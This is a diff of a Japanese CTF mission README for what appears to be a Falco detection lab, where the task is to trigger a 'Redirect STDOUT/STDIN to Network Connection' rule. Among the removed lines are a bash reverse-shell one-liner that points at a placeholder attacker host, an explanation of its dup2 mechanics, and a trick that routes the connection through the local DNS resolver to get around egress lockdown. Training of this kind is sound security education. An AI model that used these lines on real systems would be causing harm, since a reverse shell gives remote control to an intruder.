@@ -4,50 +4,23 @@
 │ 目標 Falco ルール: "Redirect STDOUT/STDIN to Network Connection"  │
 └──────────────────────────────────────────────────────────────────┘
 
-# シナリオ
+# 目的
 
-backdoor は仕込んだ (Mission 07)。だが「あとで再アクセス」のための
-**reverse shell** を貼っておきたい。古典 reverse shell payload は
-**network socket fd を stdout / stderr に dup する** ことで、
-attacker server 側のターミナルにシェルを生やす。
-CTF Company の Falco は、まさにこの **dup 操作** を見ている。
+**TRIGGER 課題** — Falco ルール「Redirect STDOUT/STDIN to Network Connection in Container」を
+発火させると自動で CLEARED になる (提出操作は不要)。
+reverse shell は network socket fd を stdout/stderr に dup する。Falco は、まさに
+この dup 操作を見張っている。
 
-# ゴール
+# 攻略ヒント
 
-このコンテナで Falco ルール「Redirect STDOUT/STDIN to Network
-Connection in Container」を発火させる。発火 = solve。
-
-# 背景
-
-reverse shell の最小 payload (Bash 版):
-
-  bash -i >& /dev/tcp/<attacker>/<port> 0>&1
-
-ここでやっている事:
-  1. `/dev/tcp/<host>/<port>` — bash builtin で TCP socket を open
-  2. `>&` で stdout/stderr をその socket fd に **dup2**
-  3. shell の interactive モード起動
-
-Falco rule は 2 番目の **dup2 (= dup syscall + dst fd ∈ {0,1,2})** が
-**ipv4/ipv6 socket fd を対象に行われたら** alert する。
-
-# 試すこと
-
-⚠ このワークスペースは egress lockdown 済み (P11.5) — collector / DNS /
-API server 以外への outbound は届かない (接続が silently drop され、
-connect() がハングして dup2 に到達しない = 発火しない)。**接続先はこの
-Pod 自身の DNS リゾルバ (常に許可されている) にする**:
-
-  DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
-  bash -c "exec 1<>/dev/tcp/$DNS/53"
-
-bash の `<>` は:
-  - `connect(socket, "$DNS:53")` — DNS サーバは TCP 53 も受け付けるので即成立
-  - `dup2(socketfd, 1)`  ← Falco 発火
+手順とコマンドは、ポータルの **Story タブ**（Journey UI）にある段階ヒント
+「気付き → 概要 → 解答」から開く（開示するとスコアが段階的に減点される）。
+この端末はコマンドを実行する場所で、攻略手順そのものはここには置かない。
 
 # クリア条件
 
-`Redirect STDOUT/STDIN to Network Connection in Container` が発火。
+`Redirect STDOUT/STDIN to Network Connection in Container` がユーザ Namespace で発火する
+→ 自動で CLEARED。
 
 # 環境にあるもの
 
